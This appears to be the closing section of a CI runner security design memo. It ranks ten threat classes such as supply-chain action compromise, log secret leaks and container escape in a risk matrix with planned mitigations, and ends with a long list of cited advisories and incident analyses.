| # | Problem | Likelihood (1-5) | Impact (1-5) | Score | Phase 1 priority |
|---|---|:---:|:---:|:---:|:---:|
| 4 | Supply-chain attack via action deps | 5 | 5 | **25** | P0 — ship SHA-pinning + curated registry in Phase 1 |
| 3 | Secret exfiltration via logs | 5 | 4 | **20** | P0 — server-side secret isolation in Phase 1 |
| 9 | PR-from-fork credential theft | 5 | 4 | **20** | P0 — two-workflow split + CodeQL-equivalent lint in Phase 1 |
| 7 | Privileged container / docker.sock misuse | 4 | 5 | **20** | P0 — no host socket, kaniko default, forbidden caps in Phase 1 |
| 8 | Network egress exfiltration | 4 | 4 | **16** | P1 — `--network=none` default in Phase 1, signed allowlist in Phase 2 |
| 1 | Container sandbox escape | 3 | 5 | **15** | P0 — gVisor default, runc-version gate (already in Phase 1) |
| 2 | Cache poisoning across users | 3 | 4 | **12** | P1 — server-side cache key signing in Phase 2 |
| 6 | Persistent-runner state leakage | 3 | 4 | **12** | P1 — per-job tmpfs + env reset already in Phase 1; per-tenant fleets in Phase 2 |
| 5 | TOCTOU between registration and pickup | 2 | 4 | **8** | P1 — mTLS + signed job payload in Phase 2 |
| 10 | Runner token theft / impersonation | 2 | 4 | **8** | P1 — mTLS + hardware attestation in Phase 2 |

**Reading the matrix.** Problems 4, 3, 9, 7 are the *must-fix-now*
four — they have either high likelihood (P4, P3, P9 are the most
exploited classes in 2024-2026) or extreme impact (P7 is
single-line root). Problems 8, 1, 2, 6 are *must-fix-soon* — they
either have a default that handles them (P1: gVisor; P8:
`--network=none`; P6: ephemeral tmpfs) and need the Phase 2
hardening, or they need the cryptographic cache key work that
lands with the R2 cutover. Problems 5 and 10 are *must-fix-by-Phase-2* —
the architectural fixes (mTLS, hardware attestation, signed job
payloads) require the Hono API to grow the corresponding
endpoints, and the runner daemon to ship the TPM/credential-store
plumbing; both are Phase 2 work.

### A case for an 11th problem: job-output artifact trust
The brief allows one additional problem if it's more critical
than these ten. **Job-output artifact trust** (a runner
attaches a build artifact that is then downloaded by a
deployment pipeline, which trusts the artifact because it came
from CI) is the *upstream* version of supply-chain attack:
once the artifact is signed by the CI runner's key and
uploaded, every downstream consumer trusts it. The Codecov
incident already showed the cross-package consequence (the
bash uploader modified at install time -> all customers'
pipelines run the malicious version). GitHub's response is
*attestations* — SLSA provenance signed by the runner's
OIDC identity, verifiable by `gh attestation verify`. This
class is more critical than problem 10 because the
artifact-attestation system is the *only* defense against a
runner whose code execution path is compromised *during the
build* — without it, you have to trust the build itself,
which is the thing you're trying not to trust. It belongs on
the matrix at likelihood 4 × impact 5 = 20, tied with P9. We
will address it in the *attestations* design doc (separate
file).

---

# Citations

1. Snyk Labs, "CVE-2024-21626: runc process.cwd and leaked fds
   container breakout", 2024-01-31 (updated 2026-09-28).
   https://snyk.io/blog/cve-2024-21626-runc-process-cwd-container-breakout/

2. Docker, "Docker Security Advisory: Multiple Vulnerabilities
   in runc, BuildKit, and Moby", 2024-01-31.
   https://www.docker.com/blog/docker-security-advisory-multiple-vulnerabilities-in-runc-buildkit-and-moby/

3. NCC Group, "Contain Yourself: Exploring Container Isolation
   Mechanisms", 2022.
   https://www.nccgroup.com/

4. GitHub, "About self-hosted runners".
   https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners

5. GitLab, "Use Docker to build Docker images".
   https://docs.gitlab.com/ci/docker/using_docker_build/

6. GitLab, "Use Docker-in-Docker".
   https://docs.gitlab.com/ci/docker/docker_in_docker/

7. Drone, "Docker Runner Overview".
   https://docs.drone.io/runner/docker/overview/

8. Gitea, "Actions Overview".
   https://docs.gitea.com/usage/actions/overview

9. GitHub, "Security hardening for GitHub Actions" (cache
   behaviour for `pull_request_target`).
   https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target

10. Forgejo, "Forgejo Actions administrator guide".
    https://forgejo.org/docs/latest/admin/actions/

11. GitHub Security Lab, "Keeping your GitHub Actions and
    workflows secure Part 4: New vulnerability patterns and
    mitigation strategies", 2025-01-16.
    https://securitylab.github.com/resources/github-actions-new-patterns-and-mitigations/

12. GitGuardian, "Compromised tj-actions/changed-files GitHub
    Action: A look at publicly leaked secrets", 2025-03-18.
    https://blog.gitguardian.com/compromised-tj-actions/

13. The Hacker News, "Gheist Uses Stolen GitHub Tokens to
    Steal Private Repository Secrets via Actions Logs",
    2026-10-26.
    https://thehackernews.com/2026/10/gheist-uses-stolen-github-tokens-to.html

14. GitHub, "Compromised runners".
    https://docs.github.com/en/actions/concepts/security/compromised-runners

15. Travis CI, "Best Practices in Securing Your Data".
    https://docs.travis-ci.com/user/best-practices-security/

16. Wiz, "GitHub Action tj-actions/changed-files supply chain
    attack (CVE-2025-30066)", 2025-03-15 (updated 2025-03-17).
    https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066

17. Unit 42 (Palo Alto Networks), "GitHub Actions Supply Chain
    Attack: A Targeted Attack on Coinbase Expanded to the
    Widespread tj-actions/changed-files Incident", 2025-03-20
    (updated 2025-04-02).
    https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/

18. GitHub, "Security hardening for GitHub Actions" (general
    hardening guidance, including SHA pinning).
    https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions

19. Gitea, "Gitea Runner".
    https://docs.gitea.com/usage/actions/runner

20. NCC Group, "10 real-world stories of how we've compromised
    CI/CD pipelines", 2022-08.
    https://www.nccgroup.com/research-blog/10-real-world-stories-of-how-we-ve-compromised-cicd-pipelines/

21. HackTricks, "Docker Breakout / Privilege Escalation".
    https://desecurity.github.io/hacktricks/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/

22. REFLEX, "Docker Socket and Privileged Builds".
    https://reflexframework.com/battlecards/docker-socket-and-privileged-builds

23. StepSecurity, "Evolving Harden-Runner's disable-sudo Policy
    for Improved Runner Security", 2025-04-21.
    https://www.stepsecurity.io/blog/evolving-harden-runners-disable-sudo-policy-for-improved-runner-security

24. StepSecurity, "Prevent Ultralytics Style CI/CD Security
    Attacks with Network Security Controls", 2024-12-11.
    https://www.stepsecurity.io/blog/prevent-ultralytics-style-ci-cd-security-attacks-with-network-security-controls

25. Trend Micro, "Analyzing TeamPCP's Supply Chain Attacks:
    Checkmarx KICS and elementary-data in CI/CD Credential
    Theft", 2026-05-13.
    https://www.trendmicro.com/ru_ru/research/26/e/analyzing-teampcp-supply-chain-attacks.html

26. GitGuardian, "Codecov supply chain breach — explained step
    by step", 2021-06-21.
    https://blog.gitguardian.com/codecov-supply-chain-breach/

27. StepSecurity, "hackerbot-claw: An AI-Powered Bot Actively
    Exploiting GitHub Actions", 2026-03-01.
    https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation

28. OWASP, "GitHub Actions Security Cheat Sheet".
    https://cheatsheetseries.owasp.org/cheatsheets/GitHub_Actions_Security_Cheat_Sheet.html

29. Truffle Security, "How Secrets Leak in CI/CD".
    https://trufflesecurity.com/blog/secrets-leak-in-ci-cd

30. Aqua Security (Team Nautilus), "Public Travis CI Logs
    (Still) Expose Users to Cyber Attacks", 2022-06-13.
    https://www.aquasec.com/blog/travis-ci-security/

31. Snyk, "Reconstructing the TJ Actions Changed Files GitHub
    Actions Compromise".
    https://snyk.io/blog/reconstructing-tj-actions-changed-files-github-actions-compromise/

32. SecurityWeek, "Compromised SpotBugs Token Led to GitHub
    Actions Supply Chain Hack", 2025-04-04.
    https://www.securityweek.com/compromised-spotbugs-token-led-to-github-actions-supply-chain-hack/

33. Orca Security, "pull_request_nightmare Part 2: Exploiting
    GitHub Actions for RCE and Supply Chain".
    https://orca.security/resources/blog/pull-request-nightmare-part-2-exploits/

34. Boost Security Labs, "SLSA dip — It's Build Time!",
    2022-11-18.
    https://labs.boostsecurity.io/articles/slsa-dip-its-build-time/

35. Cloud Security Alliance, "CSA Research Note: GitHub Actions
    PRT Scan Supply Chain 2026".
    https://labs.cloudsecurityalliance.org/research/csa-research-note-github-actions-prt-scan-supply-chain-2026/

36. Petr Švihlík, "Using Environment Protection Rules to Secure
    Secrets When Building External Forks with
    pull_request_target", 2021-03-05.
    https://petrsvihlik.com/posts/using-environment-protection-rules-to-secure-secrets-when-building-external-forks-with-pull_request_target

37. MITRE ATT&CK, "Poisoned Pipeline Execution, Technique
    T1677".
    https://attack.mitre.org/techniques/T1677/

38. GitGuardian, "Compromised Ultralytics supply chain attack
    analysis" (referenced via Wiz blog).
    https://www.wiz.io/blog/ultralytics-supply-chain-attack

39. Travis CI retrospective, "Travis CI Token Leak: What
    Happened and Why", 2021.
    https://safeguard.sh/resources/blog/travis-ci-token-leak-retrospective-2021

40. CVE.org / NVD, "CVE-2025-30066".
    https://nvd.nist.gov/vuln/detail/CVE-2025-30066

---

# Closing note

The four P0 items (P3, P4, P7, P9) are the *known* top-of-leaderboard
exploit classes. They are P0 not because they are intellectually
deep but because they are *currently being exploited daily*. The
Phase 1 architecture memo (`docs/ci-security.md` §2) correctly
chose gVisor over Docker — that addresses P1 and P7 simultaneously
and buys a year of headroom on P5 and P10. What the Phase 1 memo
*does not yet address* is P3 (server-side secret isolation beyond
env vars), P4 (SHA-pinning enforcement at upload time), and P9
(two-workflow split with hard validation). Those are the three
*must-add* items for Phase 1, and they should land before the
runner accepts any workflow from a public repo.

The six remaining problems (P2, P5, P6, P8, P10, plus the
artifact-attestation extension) are P1 and P2 because they have
*architectural* fixes that touch the API surface, the runner
daemon, and the cache backend in non-trivial ways. Each one is a
multi-week piece of work; none of them is *urgent* on day one,
because the gVisor default already contains the blast radius of
each one.

The 11th problem — job-output artifact trust — is the one this
document does not solve. It needs its own design memo and its
own Phase 2 deliverable. Without it, all of the above is moot:
a compromised runner can produce a *signed* artifact that every
downstream consumer trusts. Attestations are the answer; they
will be addressed in `docs/artifact-attestations.md` (Phase 2).
